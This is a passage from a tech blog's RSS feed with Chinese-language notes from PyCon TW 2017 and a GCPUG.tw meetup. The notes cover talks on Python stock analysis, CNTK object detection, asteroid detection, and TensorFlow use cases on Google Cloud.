&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Discussion  &lt;ul&gt;
&lt;li&gt;some 3rd-party libraries may not work well  &lt;ul&gt;
&lt;li&gt;they have been guaranteed to be the only active instance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;64-bits address space is big enough; is put them altogether a good idea?  &lt;ul&gt;
&lt;li&gt;Similar debates on monolithic and microkernel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;反正我今天就是來胡說八道的，我可以大膽預測，3~5年內一定會出現相關的第三方應用，可能會完全捨棄安全性而只著重在效能的方面  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;About removing GIL, reference Larry Hastings The Gilectomy: https://www.youtube.com/watch?v=pLqv11ScGsQ  &lt;/p&gt;
&lt;h2&gt;土炮股票分析系統&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Spearker: Victor Gau  &lt;/li&gt;
&lt;li&gt;Slides: &lt;a href="https://goo.gl/JVLhRh"&gt;https://goo.gl/JVLhRh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub Repo: &lt;a href="https://github.com/victorgau/PyConTW2017"&gt;https://github.com/victorgau/PyConTW2017&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;講者使用 Jupyter Notebook 一步步教學，&lt;br /&gt;
講解如何用 Python 去抓取和分析股票資訊，&lt;br /&gt;
使用到 Pandas, Quandl, Numpy, ffn 等 modules，&lt;br /&gt;
並透過 Jupyter Notebook 做簡單的視覺化。&lt;br /&gt;
還加上了一些基本的投資教學，&lt;br /&gt;
並在開頭的時候講了一些股票投資的小故事。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;投資是藝術還是科學？  &lt;ul&gt;
&lt;li&gt;與生俱來或可被訓練？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.books.com.tw/products/0010384228"&gt;華爾街傳奇：海龜投資法則&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;William Eckhardt vs Richard Dennis  &lt;ul&gt;
&lt;li&gt;William 相信是與生俱來的  &lt;/li&gt;
&lt;li&gt;Richard 則相信是可被訓練的  &lt;ul&gt;
&lt;li&gt;用好幾台 DOS 去跑分析  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;投資 3M's  &lt;ul&gt;
&lt;li&gt;Mind: 投資心理  &lt;/li&gt;
&lt;li&gt;Money: 資金管理  &lt;ul&gt;
&lt;li&gt;Equal weight  &lt;/li&gt;
&lt;li&gt;停損、停利  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Method: 方法、系統  &lt;ul&gt;
&lt;li&gt;今天會談到的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;架構圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;          +-------&amp;gt; 股價資料 -----------------+  
          |   |                               |  
抓資料 ---+---+---&amp;gt; 財報資料 ---&amp;gt; 選股策略 ---+---&amp;gt; 進出場策略 ---&amp;gt; 部位規模  
          |   |                      |        |          |             ^  
          +---+---&amp;gt; 公司資料         ˇ        |          ˇ             |  
                                  候選股票 ---+       投資標的 --------+  
                                     ^  
                                     |  
                                   自選股  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;抓資料  &lt;ul&gt;
&lt;li&gt;google 一下關鍵字  &lt;ul&gt;
&lt;li&gt;e.g. "Nasdaq company list"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用 Pandas  &lt;/li&gt;
&lt;li&gt;使用 &lt;a href="https://www.quandl.com/"&gt;Quandl&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;讀歷史股價  &lt;ul&gt;
&lt;li&gt;用 Quandl 使用 "Yahoo/TW_${股票代號}"  &lt;/li&gt;
&lt;li&gt;要用調整過後的股價去算，不然會有問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;選股策略  &lt;ul&gt;
&lt;li&gt;計算每天股價的變化  &lt;/li&gt;
&lt;li&gt;計算波動率  &lt;ul&gt;
&lt;li&gt;Standard deviation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;進出場策略  &lt;ul&gt;
&lt;li&gt;自己決定  &lt;/li&gt;
&lt;li&gt;Sharpe Ratio  &lt;ul&gt;
&lt;li&gt;不希望大起大落  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Maximum Drawdown  &lt;ul&gt;
&lt;li&gt;不希望賺錢了之後結果兩個月都沒賺  &lt;/li&gt;
&lt;li&gt;Maximum Drawdown 短一點就比較不會大起大落  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;f.fn()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DEMO  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/victorgau/PyConTW2017"&gt;https://github.com/victorgau/PyConTW2017&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Deep Learning Based Object Detection (Fast R-CNN) in the Microsoft Cognitive Toolkit&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Herman Wu  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;link: https://tw.pycon.org/2017/en-us/events/talk/348099433595928706/  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Cognitive 特性  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python and C++ API  &lt;ul&gt;
&lt;li&gt;大部份用 C++ 實作  &lt;/li&gt;
&lt;li&gt;Low level + high level Python API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Extensibility  &lt;ul&gt;
&lt;li&gt;User functions and learners in pure Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Readers  &lt;ul&gt;
&lt;li&gt;Distributed highly...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep Learning Revolutionized Image Recognition  &lt;ul&gt;
&lt;li&gt;Largetst image datatset - ImageNET  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;COCO Segmentation Challenge 2016  &lt;ul&gt;
&lt;li&gt;MSRA won 1st place back-to-back  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Semantic Segmentation  &lt;ul&gt;
&lt;li&gt;Recognizing pixels  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;First CNTK Example  &lt;ul&gt;
&lt;li&gt;CNTK Model  &lt;/li&gt;
&lt;li&gt;MNIST Handwritten Digits (OCR)  &lt;/li&gt;
&lt;li&gt;Multi-layer perceptron  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Microsoft/CNTK/tree/master/Tutorials"&gt;https://github.com/Microsoft/CNTK/tree/master/Tutorials&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;RELU  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 3 (2017/06/11)&lt;/h1&gt;
&lt;h2&gt;&lt;a href="https://github.com/pycontw/unconference"&gt;Unconference&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;用Python拯救地球： 如何找出危險的太陽系天體？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;JPL Horizon  &lt;ul&gt;
&lt;li&gt;可以看到小行星的軌跡  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;日本的「昴」望遠鏡  &lt;ul&gt;
&lt;li&gt;兩公尺高  &lt;/li&gt;
&lt;li&gt;CCD 由一百多片 CCD 組成  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;真實看到的天文照片不是彩色的  &lt;/li&gt;
&lt;li&gt;要找出什麼？  &lt;ul&gt;
&lt;li&gt;近地小行星  &lt;/li&gt;
&lt;li&gt;小行星  &lt;/li&gt;
&lt;li&gt;古柏帶天體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;主要應用工具  &lt;ul&gt;
&lt;li&gt;Python  &lt;/li&gt;
&lt;li&gt;scipy - KDTree, array  &lt;/li&gt;
&lt;li&gt;sklearn - RandomForestClassifier (supervised and unsupervised)  &lt;/li&gt;
&lt;li&gt;astropy, pyfits, pyephem, matplotlib, multiprocessing, sqlite3  &lt;/li&gt;
&lt;li&gt;C, C++, MPI, mysql  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Super Big Data  &lt;ul&gt;
&lt;li&gt;一天將近 0.5 TB 的 raw data  &lt;/li&gt;
&lt;li&gt;包含許多恆星、星系、垃圾  &lt;ul&gt;
&lt;li&gt;一次曝光資料處理完約有數十萬至數百萬筆資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Machine Learning  &lt;ul&gt;
&lt;li&gt;利用資料庫裡的各種測量參數 (55個） 來判斷每一筆資料是否為真  &lt;/li&gt;
&lt;li&gt;ML 的應用，比起傳統上的條件篩選有效的多，也被用來測量星系之間的距離（紅移）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;現況  &lt;ul&gt;
&lt;li&gt;目前有 15,621 個近地小行星被找到 (大小 1 公尺 ~ 32 公里)，目前都沒有危險  &lt;/li&gt;
&lt;li&gt;理論模型推論有將近 100 萬個 &amp;gt; 140 公尺的近地小行星（所以我們才找到約 1%）  &lt;/li&gt;
&lt;li&gt;現在正在執行的計劃：LINEAR, NEAT, CSS, NEOWISE, Pan-STARRS, ALTAS  &lt;/li&gt;
&lt;li&gt;目前許多大型國際合作計劃都以 Python 為主要的程式語言，並結合 Cython 或 call 外部 script 以提升分析速度，例如：  &lt;ul&gt;
&lt;li&gt;ALMA - CASA  &lt;/li&gt;
&lt;li&gt;LSST  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;微軟是主要出資者，所以開這個會議的時候不是微軟的電腦都要收起來，但天文分析基本上都是用 Unix-like 的系統，所以開完會又會拿出來 XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;為什麼用 Cython 不用 PyPy，有考慮換成 PyPy 嗎？  &lt;ul&gt;
&lt;li&gt;沒有，因為我只是使用者，這邊不是我負責的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有可能發生像電影那樣，突然發現有個朝地球高速來襲的小行星嗎？  &lt;ul&gt;
&lt;li&gt;有可能，因為距離要到夠近才有辦法偵測到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;筆直衝過來的小行星只會有一個點，這有辦法偵測到嗎？  &lt;ul&gt;
&lt;li&gt;目前這個比較難處理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;真的發現有會造成地球物種大規模毀滅的小行星朝地球衝過來怎麼辦？  &lt;ul&gt;
&lt;li&gt;基本上目前想到的方法都不太可行，例如：核彈爆破、派人上去鑽礦等等  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;CPython code sprint&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://docs.python.org/devguide/"&gt;https://docs.python.org/devguide/&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;一個軟體工程師在農村的見聞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://ocf.tw/p/2017/openhackfarm/"&gt;http://ocf.tw/p/2017/openhackfarm/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Slides: https://hackmd.io/p/Hyzjn1FGb#/  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;懶得答題？寫個 bot 來幫你刷榜&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slides: https://github.com/aweimeow/PyConTW2017-UnConf-Slide  &lt;/li&gt;
&lt;li&gt;Code: https://github.com/aweimeow/PyConTW2017-Quiz-Solver  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;初めてのプログラミングならパイザで始めよう☆&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Online Judge Special Events  &lt;ul&gt;
&lt;li&gt;https://paiza.jp/logic_summoner  &lt;/li&gt;
&lt;li&gt;https://paiza.jp/cgc  &lt;/li&gt;
&lt;li&gt;https://paiza.jp/poh/hatsukoi  &lt;/li&gt;
&lt;li&gt;https://paiza.jp/poh/ando  &lt;/li&gt;
&lt;li&gt;https://paiza.jp/moshijo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;預訂現場live解一題看看,破除never live demo迷思(?)  &lt;/p&gt;
&lt;p&gt;hatsukoi 雙馬尾參考答案(Python3)&lt;br /&gt;
```python=  &lt;/p&gt;
&lt;h1&gt;coding: utf-8&lt;/h1&gt;
&lt;h1&gt;自分の得意な言語で&lt;/h1&gt;
&lt;h1&gt;Let's チャレンジ！！&lt;/h1&gt;
&lt;p&gt;s = int(input())&lt;br /&gt;
t = int(input())&lt;br /&gt;
print(''.join(('-', '+')[i+1==t] for i in range(s)))&lt;br /&gt;
```  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Fri, 09 Jun 2017 17:51:37 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-06-09:posts/2017/06/09/pycon-tw-2017/</guid><category>Python</category><category>PyCon</category><category>PyCon TW</category></item><item><title>GCPUG.tw #26</title><link>https://blog.m157q.tw/posts/2017/06/02/gcpug-tw-26/</link><description>&lt;p&gt;Event link: &lt;a href="https://gcpugtw.kktix.cc/events/meetup201706"&gt;https://gcpugtw.kktix.cc/events/meetup201706&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;GCP Next 2017 recap&lt;/h3&gt;
&lt;h4&gt;Keynote&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Fe-Fe Li  &lt;/li&gt;
&lt;li&gt;Vint Cerf  &lt;ul&gt;
&lt;li&gt;TCP/IP  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mac Andreessen  &lt;ul&gt;
&lt;li&gt;Netscape  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Eric Schmidt  &lt;ul&gt;
&lt;li&gt;Google has spent $30B in building Google Cloud in the past 3 years.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Migrate 到 GCP 的知名企業  &lt;ul&gt;
&lt;li&gt;Disney  &lt;/li&gt;
&lt;li&gt;SAP  &lt;/li&gt;
&lt;li&gt;高露潔  &lt;/li&gt;
&lt;li&gt;Verizon  &lt;/li&gt;
&lt;li&gt;Home Depot  &lt;/li&gt;
&lt;li&gt;HSBC  &lt;ul&gt;
&lt;li&gt;金融業算是對 Cloud 這部份最保守的行業  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;eBay  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他重要公佈  &lt;ul&gt;
&lt;li&gt;2017 有 4 個新 Region  &lt;/li&gt;
&lt;li&gt;2018 有 5 個新 Region  &lt;/li&gt;
&lt;li&gt;Cloud Spanner beta  &lt;/li&gt;
&lt;li&gt;Committed-Used Discount  &lt;/li&gt;
&lt;li&gt;Titan  &lt;/li&gt;
&lt;li&gt;Dataprep  &lt;/li&gt;
&lt;li&gt;Video Intelligence API  &lt;ul&gt;
&lt;li&gt;進階版的 Vision API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Loss Prevention (in G Suite)  &lt;/li&gt;
&lt;li&gt;CloudSQL w/ PostgreSQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;大會議程&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Kubernetes  &lt;ul&gt;
&lt;li&gt;Fast Develop Productivity  &lt;/li&gt;
&lt;li&gt;Efficient Scale Out  &lt;/li&gt;
&lt;li&gt;Open Architecture  &lt;/li&gt;
&lt;li&gt;Serverless / NoOps  &lt;/li&gt;
&lt;li&gt;Security  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tensorflow  &lt;ul&gt;
&lt;li&gt;利用 MINST 的手寫字體作為 demo  &lt;/li&gt;
&lt;li&gt;Softmax classification  &lt;/li&gt;
&lt;li&gt;Noisy  &lt;/li&gt;
&lt;li&gt;Overfitting  &lt;/li&gt;
&lt;li&gt;Learning Rate Decay  &lt;/li&gt;
&lt;li&gt;Dropout  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://goo.gl/pHeXe7"&gt;https://goo.gl/pHeXe7&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.comn/martin-gorner/tensorflow-mnist-tutorial"&gt;https://github.comn/martin-gorner/tensorflow-mnist-tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Spanner  &lt;ul&gt;
&lt;li&gt;Google DoubleClick / AdWords 內部自己在用的服務  &lt;/li&gt;
&lt;li&gt;Scalabiltiy - 只要把 instance number 改掉  &lt;/li&gt;
&lt;li&gt;會自己學習你的 Query Pattern, 自動優化資料  &lt;/li&gt;
&lt;li&gt;Interleave Table  &lt;ul&gt;
&lt;li&gt;Table 之間的 Logical relation  &lt;/li&gt;
&lt;li&gt;Pre-computed JOIN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;也是需要 Warmup  &lt;/li&gt;
&lt;li&gt;有人直接拿來取代 MySQL 來用 (Quizlet)  &lt;ul&gt;
&lt;li&gt;500GB Data, 8 billions rows  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Storage and Optimization Tuning  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;教育訓練與認証&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Codelabs  &lt;ul&gt;
&lt;li&gt;各個 Google Cloud 主題的互動式免費教學  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GCP 認証  &lt;ul&gt;
&lt;li&gt;Data Engineer  &lt;ul&gt;
&lt;li&gt;設計資料、資料模型  &lt;/li&gt;
&lt;li&gt;什麼資料要用什麼服務放  &lt;ul&gt;
&lt;li&gt;BigTable, BigQuery, Datastore, GCS, ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Architect  &lt;ul&gt;
&lt;li&gt;架構設計、Solution 選擇  &lt;/li&gt;
&lt;li&gt;安全性設計  &lt;/li&gt;
&lt;li&gt;成本最佳化 (Cost-down)  &lt;/li&gt;
&lt;li&gt;現有服務整合  &lt;/li&gt;
&lt;li&gt;要花 200 鎂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;技術展示&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Jupiter Switch  &lt;ul&gt;
&lt;li&gt;Google 自製的 Data Center Switch  &lt;/li&gt;
&lt;li&gt;單櫃有 1300 Tbps 的 throughput  &lt;/li&gt;
&lt;li&gt;Juniper 最大台的 MX2020 也只有 80 Tbps 的 throughput  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pokemon Go  &lt;ul&gt;
&lt;li&gt;CRE (Customer Reliability Engineer)  &lt;ul&gt;
&lt;li&gt;專案夠大的話，Google 會派工程師去協助該公司解決問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datastore 無痛 auto-scaling 50 倍的預期流量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Machine Learning + 農業  &lt;ul&gt;
&lt;li&gt;日本人用 Raspberry Pi + Tensorflow 替農夫用電腦來做小黃瓜等級篩選  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Evernote 搬家  &lt;ul&gt;
&lt;li&gt;在 70 天內搬了 3.5 PB  &lt;/li&gt;
&lt;li&gt;提升使用者存取速度  &lt;/li&gt;
&lt;li&gt;安全性提升  &lt;/li&gt;
&lt;li&gt;搬家的主要原因是為了做 Machine Learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LUSH  &lt;ul&gt;
&lt;li&gt;22 天就把全部環境包含軟體開發流程搬上 GCP  &lt;/li&gt;
&lt;li&gt;典型的先用 G Suite 再考慮 GCP 的客戶  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Spanner  &lt;ul&gt;
&lt;li&gt;主打 ACID、水平擴展、高可靠度  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;G Suite  &lt;ul&gt;
&lt;li&gt;Hangout 改版，主打多人會議功能  &lt;/li&gt;
&lt;li&gt;可以 25 個人同時視訊會議  &lt;/li&gt;
&lt;li&gt;Data Loss Prevention  &lt;/li&gt;
&lt;li&gt;Jamboard  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;TensorFlow in the Wild&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Speaker: &lt;a href="https://github.com/kazunori279"&gt;Kaz Sato&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Staff Developer Advocate Data &amp;amp; Analytics, Google Cloud  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Machine Learning? AI? Neural Network?  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Artificial Intelligence  &lt;ul&gt;
&lt;li&gt;The science of making things smart  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Machine Learning  &lt;ul&gt;
&lt;li&gt;Building machines that can learn  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Neural Network  &lt;ul&gt;
&lt;li&gt;A type of algorithm in machine learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Neural Network  &lt;ul&gt;
&lt;li&gt;is a function that can learn  &lt;/li&gt;
&lt;li&gt;tons of multiply and add  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://playground.tensorflow.org"&gt;http://playground.tensorflow.org&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ML at Google  &lt;ul&gt;
&lt;li&gt;Almost every products in Google use Maching Learning  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://deepmind.com/blog/wavenet-generative-model-raw-audio"&gt;https://deepmind.com/blog/wavenet-generative-model-raw-audio&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Generate bit by bit with Neural Network  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deteciton of Diabetic disease  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://keynote-video-demo.appspot.com/video/barcelona-webm"&gt;https://keynote-video-demo.appspot.com/video/barcelona-webm&lt;/a&gt; (Login Required)  &lt;ul&gt;
&lt;li&gt;可以分析影片中每一秒出現的物件是什麼，有點像是把每一個 frame 都丟去給 Vision API 後得到的結果  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Tensorflow&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Open Source  &lt;/li&gt;
&lt;li&gt;Easy to use  &lt;/li&gt;
&lt;li&gt;You can use it to train your own data  &lt;/li&gt;
&lt;li&gt;Protable and Scalable  &lt;ul&gt;
&lt;li&gt;Training on  &lt;ul&gt;
&lt;li&gt;Mac / Windows  &lt;/li&gt;
&lt;li&gt;GPU Server  &lt;/li&gt;
&lt;li&gt;GPU cluster / cloud  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Prediction on  &lt;ul&gt;
&lt;li&gt;Android and iOS  &lt;/li&gt;
&lt;li&gt;RPi and TPU  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;With great tools like &lt;a href="https://www.tensorflow.org/get_started/summaries_and_tensorboard"&gt;TensorBoard&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;TensorFlow 1.0 released in Feb 2017  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://keras.io/"&gt;Keras&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kazunori279/TensorFlow-for-absolute-beginners/blob/master/2.%20Classify%20Manhattan%20with%20TensorFlow.ipynb"&gt;Classifying Manhattan with TensorFlow and BigQuery&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kazunori279/TensorFlow-for-absolute-beginners"&gt;https://github.com/kazunori279/TensorFlow-for-absolute-beginners&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Community and Eco-System  &lt;/li&gt;
&lt;li&gt;Demo of TensorFlow  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/blog/big-data/2016/08/how-a-japanese-cucumber-farmer-is-using-deep-learning-and-tensorflow"&gt;TensorFlow powered Cucumber Sorter&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;電腦也碼ㄟ選小黃瓜  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rt-net.jp/karaage1/"&gt;TensorFlow powered Fried Chicken Nugget Server&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;人工智慧炸雞塊...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://memo.sugyan.com/entry/2016/10/12/084751"&gt;TV popstar face generator with DCGAN&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TensorFLow in enterprise  &lt;ul&gt;
&lt;li&gt;The Challenge: Computing Power  &lt;/li&gt;
&lt;li&gt;Cloud Maching Learning Engine (ML Engine)  &lt;ul&gt;
&lt;li&gt;Fully manged distributed training and prediction  &lt;/li&gt;
&lt;li&gt;Scales to tens of CPUs and GPUs  &lt;/li&gt;
&lt;li&gt;Supports custom TensorFlow Graphs  &lt;/li&gt;
&lt;li&gt;HyperTune  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.techrepublic.com/article/7-companies-that-used-machine-learning-to-solve-real-business-problems/"&gt;Real cases&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Kewpie: Finding the bad potato cubes (by TensorFlow)  &lt;ul&gt;
&lt;li&gt;A major food manufacturer in Japan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AXA: Finding "large loss" car accidents  &lt;ul&gt;
&lt;li&gt;TensorFlow gives 78% accuracy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AUCNET IBS  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://konpeki.io/"&gt;https://konpeki.io/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;AUCNET IBS is a car auction service in Japan. The company relies on multiple photos for each vehicle, and they were previously sorted and categorized manually. AUCNET IBS built an image classifier that detects the model of the car and the parts featured in the photo with 95% accuracy.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TensorFlow + BigQuery  &lt;ul&gt;
&lt;li&gt;Define an UDF to calc similariry  &lt;ul&gt;
